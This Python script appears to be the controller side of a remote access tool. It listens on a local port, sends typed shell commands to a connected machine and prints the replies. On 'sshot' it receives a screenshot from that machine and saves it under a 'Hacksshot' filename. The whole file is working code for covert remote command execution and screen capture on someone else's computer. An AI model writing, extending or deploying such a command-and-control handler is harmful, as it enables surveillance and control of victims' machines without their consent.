import socket
from datetime import datetime


try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("Socket created sucessfully")
except socket.error as e:
    print(f"Unable to create socket with error : {e}")

port = 8082

s.bind(('127.0.0.1',port))
print(f"Socket binded with port : {port}")

s.listen(3)
print("Listening for the connection")

c,addr = s.accept()
print(f"Got connection from : {addr}")

def callmul():
        
        cmd = input("$ ")
        c.send(cmd.encode())
        if cmd=="sshot":
            current_time = datetime.now()
            formatted_time = current_time.strftime("%Y-%m-%d_%H-%M-%S")
        # Create a filename based on the time and date
            filename = f"Hacksshot{formatted_time}.jpg"
            with open(filename, 'wb') as file:
        # Receive and write image data in chunks
                chunk_size = 1024
                data = c.recv(chunk_size)
                while data:
                    file.write(data)
                    data = c.recv(chunk_size)
            

        elif cmd=="endit":
            s.close()
            import sys
            sys.exit()
        else:
            print(c.recv(1024))
            callmul()


callmul()




    